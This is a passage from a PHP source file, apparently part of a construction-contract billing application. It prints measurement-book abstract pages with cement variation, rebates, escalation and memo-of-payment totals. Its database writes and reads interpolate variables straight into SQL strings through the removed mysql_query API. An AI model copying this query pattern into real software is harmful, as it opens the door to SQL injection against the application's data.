					$DPMCvVarQty 	= round($DPMCemVarQtyArr[$subdivid],$decimal);
					$UPTOCvVarQty	= round(($SLMCvVarQty + $DPMCvVarQty),$decimal);
					
					$SLMCvVar		= round(($SLMCvVarQty * $CvDiffence),$decimal);
					$DPMCvVar 		= round(($DPMCvVarQty * $CvDiffence),$decimal);
					$UPTOCvVar		= round(($SLMCvVar + $DPMCvVar),$decimal);
					
					$SLMCvVarAmt 	= round($SLMCemVarArr[$subdivid],2);
					$DPMCvVarAmt 	= round($DPMCemVarArr[$subdivid],2);
					$UPTOCvVarAmt 	= round(($SLMCvVarAmt + $DPMCvVarAmt),2);
					
					$slm_amount_item = $slm_amount_item + $SLMCvVarAmt;
					$dpm_amount_item = $dpm_amount_item + $DPMCvVarAmt;
					$total_amt_item = $total_amt_item + $UPTOCvVarAmt;
					$rowcount++; $Line++;
					
?>

				<tr border='1' class="labelprint" bgcolor="">
					<td  align='center' width='' class=''>CV<?php echo $subdivname; ?></td>
					<td  align='right' width='' class=''> Cement Variation (<?php echo $CvDiffence; ?>)</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($UPTOCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo $CVRate; ?>
					</td>
					<td  align='left' width='' class=''>
					kg<?php //echo $unit; ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($UPTOCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='left' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($DPMCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($DPMCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($SLMCvVar, $decimal, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''>
					<?php echo number_format($SLMCvVarAmt, 2, '.', ''); ?>
					</td>
					<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
				</tr>	
<?php
				}
?>	
	
<!--------------------------------------- Cement Variation Ends------------------->
	
	
	
	<tr bgcolor=""><td colspan="12">&nbsp;</td></tr>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<!--<tr bgcolor="#d4d8d8" style="height:10px"><td colspan="13" style="border-top-color:#0A9CC5; border-bottom-color:#0A9CC5;"></td></tr>-->
	<input type="hidden" name="row_count" id="row_count<?php echo $table_group_row; ?>" value="<?php echo $rowcount; ?>" />
	<?php //echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>"; ?>
	<?php
	$color_var++; $table_group_row++;
	$OverAllSlmAmount 		=  round(($OverAllSlmAmount	+	$slm_amount_item),2); 
	$OverAllDpmAmount 		=  round(($OverAllDpmAmount	+	$dpm_amount_item),2); 
	$OverAllSlmDpmAmount 	=  round(($OverAllSlmDpmAmount	+	$total_amt_item),2);
	
	
	$SLMAmountNI_DI_EI 		=  round(($SLMAmountNI_DI_EI	+	$slm_amount_item),2); 
	$DPMAmountNI_DI_EI 		=  round(($DPMAmountNI_DI_EI	+	$dpm_amount_item),2); 
	$UPTOAmountNI_DI_EI 	=  round(($UPTOAmountNI_DI_EI	+	$total_amt_item),2);
	$prev_item_flag = $item_flag;
	
	$prev_supp_sheetid_temp = $supp_sheetid_temp;
	
}
if(($item_flag != "")&&($item_flag != "NI"))
{
	$select_supp_agg_query = "select agree_no from sheet_supplementary  where supp_sheet_id = '$supp_sheetid'";
	$select_supp_agg_sql = mysql_query($select_supp_agg_query);
	if($select_supp_agg_sql == true)
	{
		if(mysql_num_rows($select_supp_agg_sql)>0)
		{
			while($SubSheet = mysql_fetch_object($select_supp_agg_sql))
			{
				$sub_agg_no = $SubSheet->agree_no;
				$AggTitleFlag = "Part Agreement - ".$no_of_supp_agg;//.$sub_agg_no;
			}
		}
	}
	if(($SuppRebateArr[$prev_supp_sheetid_temp] == 0)||($SuppRebateArr[$prev_supp_sheetid_temp] == "")){ //// ELSE IT WILL GOT AFTER REBATE STRING COME DOWN TO 2808Line Series
		$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
	}
}
//echo $Line;	
if($RebateCalcFlag == 0)
{
	$SlmRebateAmount 		=  round(($OverAllSlmAmount 	* 	$overall_rebate_perc /100),2);
	$DpmRebateAmount 		=  round(($OverAllDpmAmount 	* 	$overall_rebate_perc /100),2);
	$SlmDpmRebateAmount 	=  round(($OverAllSlmDpmAmount * 	$overall_rebate_perc /100),2);
	
	$SlmNetAmount 			=  round(($OverAllSlmAmount - $SlmRebateAmount),2); 
	$DpmNetAmount 			=  round(($OverAllDpmAmount - $DpmRebateAmount),2); 
	$SlmDpmNetAmount 		=  round(($OverAllSlmDpmAmount - $SlmDpmRebateAmount),2);
}
else
{
	$SlmNetAmount 			=  round(($OverAllSlmAmount - $SlmRebateAmount),2); 
	$DpmNetAmount 			=  round(($OverAllDpmAmount - $DpmRebateAmount),2); 
	$SlmDpmNetAmount 		=  round(($OverAllSlmDpmAmount - $SlmDpmRebateAmount),2);
	
	$OverAllSlmAmount 			=  round(($OverAllSlmAmount - $SlmRebateAmount),2); 
	$OverAllDpmAmount 			=  round(($OverAllDpmAmount - $DpmRebateAmount),2); 
	$OverAllSlmDpmAmount 		=  round(($OverAllSlmDpmAmount - $SlmDpmRebateAmount),2);
}
$Linecheck = 3;
$LineTemp = $Line + $Linecheck;
if($LineTemp >= 30){ $Line = 30; } 
if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/ Abstract MB No <?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; } ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $Line; ?></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
}
?>

<?php
if($DI_Amount_EI_Amount_Str != "")
{	
?>
		<tr>
			<td colspan='3' align='left' class='labelbold'><input type="text" name="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" id="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" style="width:98%; border:none;" readonly="" class="labelbold"/></td>
			<td colspan="2" align="right" nowrap="nowrap">TOTAL AMOUNT</td>
			<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
		</tr>
		
		<?php if(($SuppRebateArr[$prev_supp_sheetid_temp] != 0)&&($SuppRebateArr[$prev_supp_sheetid_temp] != "")){
				$SuppRebateperc = $SuppRebateArr[$prev_supp_sheetid_temp];
				$SuppAgmtSlmRebateAmount 		=  round(($SLMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtDpmRebateAmount 		=  round(($DPMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtSlmDpmRebateAmount 	=  round(($UPTOAmountNI_DI_EI * $SuppRebateperc /100),2);
				
				$SLMAmountNI_DI_EI 			=  round(($SLMAmountNI_DI_EI - $SuppAgmtSlmRebateAmount),2); 
				$DPMAmountNI_DI_EI 			=  round(($DPMAmountNI_DI_EI - $SuppAgmtDpmRebateAmount),2); 
				$UPTOAmountNI_DI_EI 		=  round(($UPTOAmountNI_DI_EI - $SuppAgmtSlmDpmRebateAmount),2);
	$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
		?>
		<tr class="labelprint">
			<td colspan="2" align="right">Less Over All Rebate : <?php echo $SuppRebateperc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php } ?>
		
		
		<!--<tr><td colspan="12" align="center" class="labelbold">Summary</td></tr>-->
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>

<?php
$Line = $LineIncr; $page++;	
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }

?>

<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
	<tr><td colspan="12" align="center" class="labelbold">Summary of Agreement wise Total Cost</td></tr>
<?
	//$Line = $LineIncr; $page++;
	$DI_Amount_EI_Amount_Str = rtrim($DI_Amount_EI_Amount_Str,"@@");
	$expDIEIStr = explode("@@",$DI_Amount_EI_Amount_Str);
	$DIEICount = count($expDIEIStr);
	$SlmNetAmount = 0;
	$DpmNetAmount = 0;
	$SlmDpmNetAmount = 0;
	$DIEITextBoxStr = "";
	//echo $DIEICount;//exit;
	for($d1=0; $d1<$DIEICount; $d1++)
	{
		$DIEIAmtSTr = $expDIEIStr[$d1];
		$DIEIStr 	= explode("*",$DIEIAmtSTr);
		$DIEITotalSLMAmt 	= $DIEIStr[0];
		$DIEITotalDPMAmt 	= $DIEIStr[1];
		$DIEITotalUPTOAmt 	= $DIEIStr[2];
		$DIEIPage 			= $DIEIStr[3];
		$DIEIMbook 			= $DIEIStr[4];
		$DIEITextboxId 		= $DIEIStr[5];
		$DIEIAggNo 			= $DIEIStr[6];
		$SlmNetAmount = $SlmNetAmount+$DIEITotalSLMAmt;
		$DpmNetAmount = $DpmNetAmount+$DIEITotalDPMAmt;
		$SlmDpmNetAmount = $SlmDpmNetAmount+$DIEITotalUPTOAmt;
		$DIEITextBoxStr .= $DIEITextboxId."*".$page."*".$abstmbno."*";
?>
		<tr class="labelprint" bgcolor="#F0F0F0">
			<td colspan="5" align="right" class=""><?php echo $DIEIAggNo; ?> Total B/f P-<?php echo $DIEIPage; ?>/MB <?php echo $DIEIMbook; ?>&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i></td>
			<!--<td>&nbsp;</td>
			<td>&nbsp;</td>-->
			<td align="right"><?php echo number_format($DIEITotalUPTOAmt, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DIEITotalDPMAmt, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DIEITotalSLMAmt, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>

<?php
	}
	$DIEITextBoxStr = rtrim($DIEITextBoxStr,"*");
}
?>

<?php if($RebateCalcFlag == 0){ ?>
	<tr class="labelprint" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Total Cost&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	<tr class="labelprint">
		<td colspan="2" align="right">Less Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	<?php $Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
<?php } ?>	
	
	<tr class="labelbold" bgcolor="#F0F0F0">
		<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmDpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
		<td align="right"><?php echo number_format($SlmNetAmount, 2, '.', ''); ?></td>
		<td>&nbsp;</td>
	</tr>
	
	
	
<?php 
$Line++; //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} 

$delete_recovery_query = "delete from generate_otherrecovery where sheetid = '$abstsheetid' and rbn = '$rbn'";
$delete_recovery_sql = mysql_query($delete_recovery_query);

$insert_recovery_query = "insert into generate_otherrecovery set abstract_net_amt = '$SlmNetAmount', sheetid = '$abstsheetid', rbn = '$rbn'";
$insert_recovery_sql = mysql_query($insert_recovery_query);

//$delete_abstract_query = "delete from abstractbook where sheetid = '$abstsheetid' and rbn = '$rbn'";
//$delete_abstract_sql = mysql_query($delete_abstract_query);

if((isset($_SESSION["abst_method"]))&&($_SESSION["abst_method"] == "ZMSA")){
	$RabFlag = "ZM";
	$DeleteQuery 	= "delete from mbookgenerate where sheetid = '$abstsheetid' and rbn = '$rbn' and rab_flag = 'ZM'";
	$DeleteSql 		= mysql_query($DeleteQuery);
	$InsertQuery 	= "insert into mbookgenerate set mbgeneratedate = NOW(), staffid = '".$_SESSION['sid']."', fromdate = '$fromdate', todate = '$todate', sheetid = '$abstsheetid', rbn = '$rbn', rab_flag = 'ZM', active = 1, is_finalbill = '$IsFinRAB', userid = ".$_SESSION['userid'];
	$InsertSql 		= mysql_query($InsertQuery);
	
	
	$DeleteQuery2 	= "delete from measurementbook_temp where sheetid = '$abstsheetid' and rbn = '$rbn' and rab_flag = 'ZM'";
	$DeleteSql2 	= mysql_query($DeleteQuery2);
	$InsertQuery2 	= "insert into measurementbook_temp set measurementbookdate = NOW(), staffid = '".$_SESSION['sid']."', fromdate = '$fromdate', todate = '$todate', sheetid = '$abstsheetid', abstmbookno = '$abstmbno', abstmbpage = '$page', part_pay_flag = 'DMY', rbn = '$rbn', active = 1, is_finalbill = '$IsFinRAB', userid = ".$_SESSION['userid'];
	$InsertSql2 	= mysql_query($InsertQuery2);


}else{
	$RabFlag = "";
}

$insert_abstarct_query 	= "update abstractbook set abs_book_date = NOW(), mbookno = '$abstmbno', mbookpage = '$page', upto_date_total_amount = '$SlmDpmNetAmount', 
dpm_total_amount = '$DpmNetAmount', slm_total_amount = '$SlmNetAmount', staffid = '$staffid', active = 1, rab_status = 'P' where sheetid = '$abstsheetid' and rbn = '$rbn'";
$insert_abstarct_sql   	= mysql_query($insert_abstarct_query);

if($Line >= 30)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/ Abstract MB No <?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; } ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?><?php //echo $abstmbno; ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td></td>
</tr>
<?php
$Line = $LineIncr; $page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
}
else
{
?>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>
<?php
/*while($Line<30)
{
	echo "<br/>";
	$Line++;
}
*/?>
Page <?php echo $page; ?></td></tr>
<?php	
}
?>
</table>
<p style='page-break-after:always;'></p>
<?php 
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
$esc_cnt = 0;

$EscQtrArray = array();
$EscTccAmtArray = array();
$EscTcaAmtArray = array();
$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rbn = '$rbn' ORDER BY quarter ASC";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		while($EscList = mysql_fetch_object($select_esc_rbn_sql))
		{
			$quarter = $EscList->quarter;
			$esc_tcc_amount = $EscList->tcc_amt;
			$esc_tca_amount = $EscList->tca_amt;
			$esc_qtr_amt = round(($esc_tcc_amount+$esc_tca_amount),2);//$EscList->esc_total_amt;
			
			
			array_push($EscQtrArray,$quarter);
			array_push($EscTccAmtArray,$esc_qtr_amt);
			//array_push($EscTcaAmtArray,$esc_tca_amount);
			$update_esc_mbook_query = 	"update escalation set tcc_absmbook = '$abstmbno', tcc_absmbpage = '$page', tca_absmbook = '$abstmbno', 
										tca_absmbpage = '$page' where flag = 0 and sheetid = '$abstsheetid' and quarter = '$quarter'";
			$update_esc_mbook_sql = mysql_query($update_esc_mbook_query);							
		}
	}
}

$rev_esc_cnt = 0;

$RevEscQtrArray = array();
$RevEscTccAmtArray = array();
$RevEscTcaAmtArray = array();
$select_rev_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rev_esc_total_amt != 0 ORDER BY quarter ASC";
$select_rev_esc_rbn_sql = mysql_query($select_rev_esc_rbn_query);
if($select_rev_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_rev_esc_rbn_sql)>0)
	{
		while($RevEscList = mysql_fetch_object($select_rev_esc_rbn_sql))
		{
			$rev_quarter = $RevEscList->quarter;
			$rev_esc_tcc_amount = $RevEscList->rev_tcc_amt;
			$rev_esc_tca_amount = $RevEscList->rev_tca_amt;
			
			$total_rev_esc_amt = round(($rev_esc_tcc_amount+$rev_esc_tca_amount),2);
			
			$paid_esc_tcc_amount = $RevEscList->tcc_amt;
			$paid_esc_tca_amount = $RevEscList->tca_amt;
			
			$total_paid_esc_amt = round(($paid_esc_tcc_amount+$paid_esc_tca_amount),2);
			
			//$rev_esc_qtr_amt = round(($rev_esc_tcc_amount+$rev_esc_tca_amount),2);//$EscList->esc_total_amt;
			$rev_esc_qtr_amt = round(($total_rev_esc_amt-$total_paid_esc_amt),2);
			
			
			
			array_push($RevEscQtrArray,$rev_quarter);
			array_push($RevEscTccAmtArray,$rev_esc_qtr_amt);
			//array_push($EscTcaAmtArray,$esc_tca_amount);
			$update_rev_esc_mbook_query = 	"update escalation set rev_tcc_absmbook = '$abstmbno', rev_tcc_absmbpage = '$page', rev_tca_absmbook = '$abstmbno', 
										rev_tca_absmbpage = '$page' where flag = 0 and sheetid = '$abstsheetid' and quarter = '$rev_quarter'";
			//echo $update_rev_esc_mbook_query."<br/>";
			$update_rev_esc_mbook_sql = mysql_query($update_rev_esc_mbook_query);							
		}
	}
}
/*$select_esc_rbn_query = "select * from escalation where sheetid = '$abstsheetid' and flag = 0 and rbn = '$rbn'";
//echo $select_esc_rbn_query."<br/>";
$select_esc_rbn_sql = mysql_query($select_esc_rbn_query);
if($select_esc_rbn_sql == true)
{
	if(mysql_num_rows($select_esc_rbn_sql)>0)
	{
		$esc_cnt = 1;
		$update_esc_mbook_query = 	"update escalation set tcc_absmbook = '$abstmbno', tcc_absmbpage = '$page', tca_absmbook = '$abstmbno', 
									tca_absmbpage = '$page' where flag = 0 and sheetid = '$abstsheetid' and rbn = '$rbn'";
		$update_esc_mbook_sql = mysql_query($update_esc_mbook_query);							
	}
}*/
$sa_cnt = 0;
$select_sa_rbn_query = "select * from secured_advance where sheetid = '$abstsheetid' and sa_flag = 'ZM' and rbn = '$rbn'";
//echo $select_esc_rbn_query."<br/>";
$select_sa_rbn_sql = mysql_query($select_sa_rbn_query);
if($select_sa_rbn_sql == true){
	if(mysql_num_rows($select_sa_rbn_sql)>0){
		$sa_cnt = 1;
		$SaList = mysql_fetch_object($select_sa_rbn_sql);
		$sec_adv_amount = $SaList->sec_adv_amount;
	}
}
$OverAllSlmDpmAmount = $SlmDpmNetAmount;
$OverAllSlmAmount = $SlmNetAmount;
$OverAllDpmAmount = $DpmNetAmount;
//echo $title;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
?>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php
echo $table;
echo "<table width='1087px' bgcolor='white' cellpadding='3' cellspacing='3' align='center' class='label table1'>";
echo $tablehead;
echo "<tr style='border:none'><td style='border:none' class='labelbold' align='center' colspan='12'><u>Memo of payment</u></td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Upto date value of work done : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmDpmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Deduct Previous Paid : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none; border-bottom:1px dashed #000000'>(-)&nbsp;&nbsp;".number_format($OverAllDpmAmount, 2, '.', '')."</td><td style='border:none; border-bottom:1px dashed #000000'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Net Amount : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'>  </td><td style='border:none' class='labelprint' align='right' colspan='5'>".number_format($OverAllSlmAmount, 2, '.', '')."</td><td style='border:none'>&nbsp;</td></tr>";
echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Secured Advance : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($sec_adv_amount, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
if(count($EscQtrArray) >0)
{
	for($q1=0; $q1<count($EscQtrArray); $q1++)
	{
		$EQtr = $EscQtrArray[$q1];
		$ETccAmt = $EscTccAmtArray[$q1];
		//$ETcaAmt = $EscTcaAmtArray[$q1];
